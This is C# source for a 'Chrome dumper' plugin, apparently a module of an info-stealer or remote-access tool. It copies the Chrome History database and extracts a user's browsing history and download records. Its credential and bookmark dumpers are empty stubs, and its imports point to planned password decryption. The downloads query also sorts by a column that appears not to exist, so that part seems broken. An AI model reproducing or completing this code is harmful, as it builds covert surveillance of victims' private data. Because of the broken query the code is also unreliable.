using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Principal;
using Org.BouncyCastle.Crypto.Generators;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Data.SQLite;

namespace Plugin48Dumper
{
    public class clsChromeDumper : clsDumper
    {
        private string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
        private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }

        private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
        private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
        private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }

        private string fnConnString(string szFilePath) => $"Data Source={szFilePath};Version=3;Read Only=True;";
        private string fnNewTempFilePath() => Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());

        public clsChromeDumper()
        {
            Description = "Chrome dumper.";
            Usage = "foo";
            Entry = "chrome";

            Available = true;
        }

        public class clsCredential
        {
            public string URL;
            public string Username;
            public string Password;
            public string szCreationDate;
            public string szLastUsed;
        }

        public class clsHistory
        {
            public string Title;
            public string URL;
            public string szLastUsed;
        }

        public class clsDownload
        {
            public string FileName;
            public string TargetPath;
            public string URL;
            public long Length;
            public string szDate;
        }

        public class clsBookmark
        {
            public string Name;
            public string URL;
            public string szAddDate;
            public string szLastUsed;
        }

        public List<clsCredential> fnlsDumpCredential(int nCount = 100)
        {
            List<clsCredential> ls = new List<clsCredential>();


            return ls;
        }

        public List<clsHistory> fnlsDumpHistory(int nCount = 100)
        {
            List<clsHistory> ls = new List<clsHistory>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(HistoryFile, dst, true);

            string szConnString = fnConnString(dst);
            using (var conn = new SQLiteConnection(szConnString))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = @"
                        SELECT 
                            CAST(url AS TEXT) AS url,
                            CAST(title AS TEXT) AS title,
                            last_visit_time
                        FROM urls
                        ORDER BY last_visit_time DESC";

                    if (nCount != -1 && nCount > 0)
                    {
                        szQuery += $" LIMIT {nCount}"; 
                    }

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string title = reader["title"]?.ToString();
                            string url = reader["url"]?.ToString();

                            long time = 0;
                            if (reader["last_visit_time"] != DBNull.Value)
                                long.TryParse(reader["last_visit_time"].ToString(), out time);

                            DateTime? dt = fnChromeTimeToDateTime(time);

                            ls.Add(new clsHistory()
                            {
                                Title = title,
                                URL = url,
                                szLastUsed = dt == null ? "N/A" : dt?.ToString("F"),
                            });
                        }
                    }
                }
            }

            File.Delete(dst);

            return ls;
        }

        public List<clsDownload> fnlsDumpDownload(int nCount = 100)
        {
            List<clsDownload> ls = new List<clsDownload>();

            string szDst = fnNewTempFilePath();
            File.Copy(HistoryFile, szDst);

            string szConnStr = fnConnString(szDst);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();

                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"SELECT target_path, total_bytes, tab_url, end_time FROM downloads ORDER BY last_visit_time DESC";
                    if (nCount != -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string szTargetPath = reader["target_path"]?.ToString();
                            long nTotalBytes = long.Parse(reader["total_bytes"]?.ToString());
                            string szURL = reader["tab_url"]?.ToString();
                            long nEndTime = long.Parse(reader["end_time"]?.ToString());

                            DateTime? dt = fnChromeTimeToDateTime(nEndTime);

                            ls.Add(new clsDownload()
                            {
                                TargetPath = szTargetPath,
                                Length = nTotalBytes,
                                URL = szURL,
                                szDate = dt == null ? "N/A" : dt?.ToString("F"),
                            });
                        }
                    }
                }
            }

            File.Delete(szDst);

            return ls;
        }

        

        public List<clsBookmark> fnlsDumpBookMark(int nCount = 100)
        {
            List<clsBookmark> ls = new List<clsBookmark>();


            return ls;
        }

        private static DateTime? fnChromeTimeToDateTime(long webkitTime)
        {
            if (webkitTime <= 0)
                return null;

            try
            {
                DateTime epoch = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc);

                return epoch.AddTicks(webkitTime * 10);
            }
            catch
            {
                return null;
            }
        }
    }
}
